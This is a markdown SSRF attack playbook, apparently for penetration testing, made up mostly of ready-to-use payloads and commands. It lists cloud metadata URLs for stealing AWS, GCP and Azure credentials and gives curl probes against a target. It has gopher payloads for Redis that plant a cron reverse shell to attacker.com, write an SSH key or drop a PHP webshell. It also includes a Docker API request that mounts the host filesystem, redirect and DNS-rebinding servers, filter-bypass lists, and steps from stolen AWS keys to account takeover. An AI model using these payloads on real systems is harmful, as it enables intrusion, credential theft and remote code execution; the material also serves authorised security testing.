# SSRF Playbook

## Indicators

Signs this vulnerability may be present:
- Application fetches external resources based on user input (URL parameters, form fields)
- Features like URL preview, PDF generation, image import, or webhook functionality
- Parameters containing URLs: `url=`, `uri=`, `path=`, `src=`, `dest=`, `redirect=`, `next=`, `data=`, `feed=`
- File import/export functionality accepting URLs
- Integration features connecting to external services
- Proxy or redirect functionality
- Error messages revealing internal hostnames or IP addresses
- Cloud-hosted applications (potential access to metadata endpoints)

## Cloud Metadata URLs

### AWS (169.254.169.254)

```bash
# IMDSv1 (no token required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2 (requires token - harder to exploit via SSRF)
# Step 1: Get token
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: [TOKEN]" http://169.254.169.254/latest/meta-data/

# ECS Task Metadata (container environments)
http://169.254.170.2/v2/credentials/[GUID]

# Lambda environment
file:///proc/self/environ
```

### GCP (169.254.169.254)

```bash
# Requires header: Metadata-Flavor: Google
http://169.254.169.254/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
http://169.254.169.254/computeMetadata/v1/instance/attributes/
http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env

# Beta endpoint (may bypass header requirement in some cases)
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

### Azure (169.254.169.254)

```bash
# Requires header: Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
```

### DigitalOcean (169.254.169.254)

```bash
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/region
```

### Kubernetes

```bash
# Service account token
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace

# Kubernetes API (if accessible)
https://kubernetes.default.svc/
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/secrets

# etcd (if exposed)
http://127.0.0.1:2379/v2/keys/
```

## Tools

### Manual Testing with curl

```bash
# Basic SSRF test - external callback
curl "http://target.com/fetch?url=http://attacker.com/ssrf-test"

# Test for internal access
curl "http://target.com/fetch?url=http://127.0.0.1:80/"
curl "http://target.com/fetch?url=http://localhost:22/"

# Cloud metadata (AWS)
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# File protocol
curl "http://target.com/fetch?url=file:///etc/passwd"

# Internal network scan
for port in 22 80 443 3306 5432 6379 8080 9200; do
    curl -s "http://target.com/fetch?url=http://127.0.0.1:${port}/" &
done
wait

# URL-encoded payload
curl "http://target.com/fetch?url=http%3A%2F%2F127.0.0.1%2F"

# Double URL-encoded
curl "http://target.com/fetch?url=http%253A%252F%252F127.0.0.1%252F"
```

### Blind SSRF with Webhook Services

```bash
# Using Burp Collaborator or alternatives
curl "http://target.com/fetch?url=http://uniqueid.burpcollaborator.net/"

# Using webhook.site
curl "http://target.com/fetch?url=https://webhook.site/unique-id"

# Using interactsh
curl "http://target.com/fetch?url=http://uniqueid.interactsh.com/"

# Using requestbin
curl "http://target.com/fetch?url=https://requestbin.io/unique-id"
```

### SSRFmap

```bash
# Clone and use SSRFmap
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap

# Basic usage
python3 ssrfmap.py -r request.txt -p url -m portscan

# Available modules
python3 ssrfmap.py -r request.txt -p url -m readfiles
python3 ssrfmap.py -r request.txt -p url -m redis
python3 ssrfmap.py -r request.txt -p url -m mysql
```

### Gopherus (Protocol Smuggling)

```bash
# Install Gopherus
git clone https://github.com/tarunkant/Gopherus

# Generate Gopher payloads for various services
python gopherus.py --exploit mysql
python gopherus.py --exploit redis
python gopherus.py --exploit fastcgi
python gopherus.py --exploit smtp
python gopherus.py --exploit zabbix
```

## Techniques

### 1. Basic SSRF

Direct access to internal resources through URL manipulation.

```bash
# Test various internal targets
# Localhost variations
http://127.0.0.1/
http://localhost/
http://127.1/
http://0.0.0.0/
http://0/
http://[::1]/
http://[::]/

# Internal network ranges
http://10.0.0.1/
http://172.16.0.1/
http://192.168.0.1/

# Common internal services
http://127.0.0.1:22/        # SSH
http://127.0.0.1:3306/      # MySQL
http://127.0.0.1:5432/      # PostgreSQL
http://127.0.0.1:6379/      # Redis
http://127.0.0.1:9200/      # Elasticsearch
http://127.0.0.1:11211/     # Memcached
http://127.0.0.1:27017/     # MongoDB

# Admin interfaces
http://127.0.0.1:8080/manager/html  # Tomcat
http://127.0.0.1:9000/              # PHP-FPM
http://127.0.0.1:15672/             # RabbitMQ
http://127.0.0.1:8500/              # Consul
http://127.0.0.1:2375/              # Docker API
http://127.0.0.1:5000/              # Docker Registry
```

### 2. Blind SSRF Detection

Confirming SSRF when responses are not returned.

```bash
# Time-based detection - measure response time difference
# Fast response (non-existent host)
curl -w "%{time_total}" "http://target.com/fetch?url=http://10.255.255.1/"

# Slow response (existing host, closed port)
curl -w "%{time_total}" "http://target.com/fetch?url=http://127.0.0.1:81/"

# DNS-based detection
curl "http://target.com/fetch?url=http://unique-id.attacker.com/"
# Check DNS logs for query

# Error message differences
# Compare responses for:
http://target.com/fetch?url=http://127.0.0.1:22/     # Open port (SSH banner)
http://target.com/fetch?url=http://127.0.0.1:12345/ # Closed port
http://target.com/fetch?url=http://10.0.0.1/        # Unreachable host
```

### 3. Protocol Smuggling

Using alternative protocols to interact with internal services.

```bash
# File protocol - read local files
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///home/user/.ssh/id_rsa
file:///var/log/apache2/access.log

# Dict protocol - interact with services
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:11211/stats

# Gopher protocol - send raw TCP data
# Redis commands via Gopher
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a*/1 * * * * bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# LDAP protocol
ldap://127.0.0.1:389/%0astatus

# TFTP protocol
tftp://attacker.com/file
```

### 4. SSRF to Internal Services

Exploiting SSRF to attack internal infrastructure.

```bash
# Redis - Write SSH key
gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$7%0d%0asshkey%0d%0a$[LENGTH]%0d%0a[SSH_PUBLIC_KEY]%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# Docker API - Create privileged container
# List containers
http://127.0.0.1:2375/containers/json

# Create container with host filesystem mounted
POST http://127.0.0.1:2375/containers/create
{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"Binds":["/:/host"]}

# Kubernetes API
http://127.0.0.1:10250/pods
http://127.0.0.1:10255/pods

# Elasticsearch
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=password

# Consul
http://127.0.0.1:8500/v1/kv/?recurse
http://127.0.0.1:8500/v1/agent/members
```

### 5. SSRF via Redirect Chains

Bypassing URL validation using redirects.

```python
#!/usr/bin/env python3
# Redirect server for SSRF bypass
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def do_redirect():
    return redirect('http://169.254.169.254/latest/meta-data/')

@app.route('/redirect-file')
def redirect_file():
    return redirect('file:///etc/passwd')

@app.route('/redirect-gopher')
def redirect_gopher():
    return redirect('gopher://127.0.0.1:6379/_INFO')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

```bash
# Use redirect server
curl "http://target.com/fetch?url=http://attacker.com/redirect"

# URL shorteners can also be abused
# 1. Create shortened URL pointing to internal target
# 2. Use shortened URL in SSRF
curl "http://target.com/fetch?url=https://bit.ly/xxx"
```

### 6. DNS Rebinding

Bypassing domain-based whitelisting using DNS with short TTL.

```python
#!/usr/bin/env python3
# Simple DNS rebinding server concept
# First query returns attacker IP (passes validation)
# Second query returns internal IP (actual request)

import socket
from dnslib import RR, A, QTYPE
from dnslib.server import DNSServer, BaseResolver

class RebindResolver(BaseResolver):
    def __init__(self):
        self.counter = {}

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        reply = request.reply()

        # Alternate between external and internal IP
        if qname not in self.counter:
            self.counter[qname] = 0

        self.counter[qname] += 1

        if self.counter[qname] % 2 == 1:
            # First request - return external IP (pass validation)
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("203.0.113.50"), ttl=0))
        else:
            # Second request - return internal IP (exploit)
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("169.254.169.254"), ttl=0))

        return reply

# Start server
resolver = RebindResolver()
server = DNSServer(resolver, port=53)
server.start()
```

## Bypass Techniques

### IP Address Obfuscation

```bash
# Decimal IP (127.0.0.1 = 2130706433)
http://2130706433/
http://0x7f000001/              # Hex
http://017700000001/            # Octal
http://127.1/                   # Shortened
http://127.0.1/                 # Missing octet
http://0177.0.0.1/              # Octal first octet
http://127.0x0.1/               # Mixed hex

# IPv6 representations
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/

# IPv6 zone ID bypass
http://[::1%25eth0]/

# CNAME/A record to localhost
http://localtest.me/           # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net/  # Custom DNS record
http://127.0.0.1.nip.io/
http://127.0.0.1.xip.io/

# Localhost alternatives
http://localhost/
http://127.127.127.127/
http://0.0.0.0/
http://0/
```

### Cloud Metadata Bypass

```bash
# AWS metadata alternatives
http://[::ffff:169.254.169.254]/
http://169.254.169.254.xip.io/
http://2852039166/              # Decimal
http://0xa9fea9fe/              # Hex

# Using DNS that resolves to metadata IP
http://metadata.attacker.com/  # A record -> 169.254.169.254

# Bypass header requirements (GCP/Azure)
# Some parsers may accept additional headers through URL parameters
# or through header injection in the URL
```

### URL Parser Confusion

```bash
# Different URL parsing behaviors
http://attacker.com@127.0.0.1/
http://127.0.0.1#@attacker.com/
http://127.0.0.1?@attacker.com/
http://127.0.0.1\@attacker.com/

# Protocol confusion
http://127.0.0.1:80\@attacker.com/
http://127.0.0.1:80%2540attacker.com/

# Fragment bypass
http://attacker.com#http://127.0.0.1/

# Backslash confusion
http://attacker.com\\@127.0.0.1/
http://attacker.com%5c@127.0.0.1/

# Encoded characters
http://127%2e0%2e0%2e1/
http://127。0。0。1/              # Unicode dot
http://①②⑦.0.0.1/              # Unicode numbers
```

### Whitelist Bypass

```bash
# If whitelisted domain is example.com
http://example.com.attacker.com/         # Subdomain
http://example.com@attacker.com/         # Auth section
http://attacker.com/example.com/         # Path
http://attacker.com#example.com/         # Fragment
http://attacker.com?example.com/         # Query string

# Open redirect on whitelisted domain
http://example.com/redirect?url=http://169.254.169.254/

# SVG/XML with external entity
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/" />
</svg>
```

### Protocol Bypass

```bash
# URL schemes that may be allowed
http://127.0.0.1/
https://127.0.0.1/
HTTP://127.0.0.1/
hTtP://127.0.0.1/

# Less common schemes
jar:http://attacker.com!/file.txt
netdoc:///etc/passwd
data:text/html,<script>fetch('http://169.254.169.254/')</script>
```

## SSRF Chains

### SSRF to RCE via Redis

```bash
# 1. Identify Redis via SSRF
http://target.com/fetch?url=http://127.0.0.1:6379/

# 2. Write webshell via Redis
gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a$25%0d%0a<?php system($_GET[c]); ?>%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# 3. Access webshell
http://target.com/shell.php?c=id
```

### SSRF to RCE via PHP-FPM

```bash
# Use Gopherus to generate payload
python gopherus.py --exploit fastcgi
# Enter: /var/www/html/index.php
# Enter: id

# Result will be Gopher URL to send via SSRF
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00...
```

### SSRF to Cloud Account Takeover

```bash
# 1. Access AWS metadata via SSRF
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Get role name from response, then get credentials
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]

# 3. Use credentials
export AWS_ACCESS_KEY_ID=[AccessKeyId]
export AWS_SECRET_ACCESS_KEY=[SecretAccessKey]
export AWS_SESSION_TOKEN=[Token]

# 4. Enumerate access
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
```

## Success Indicators

- Response contains internal service banners or content (e.g., SSH version, Redis info)
- Successful access to cloud metadata (AWS credentials, instance info)
- DNS callback received at attacker-controlled server
- HTTP callback received with internal data
- Local file contents returned (via file:// protocol)
- Different response times for reachable vs. unreachable internal hosts
- Error messages revealing internal hostnames or IP addresses
- Ability to port scan internal network based on response differences
- Successfully chained SSRF to internal service exploitation (Redis, Docker, etc.)
- Cloud credentials obtained and validated with AWS/GCP/Azure CLI
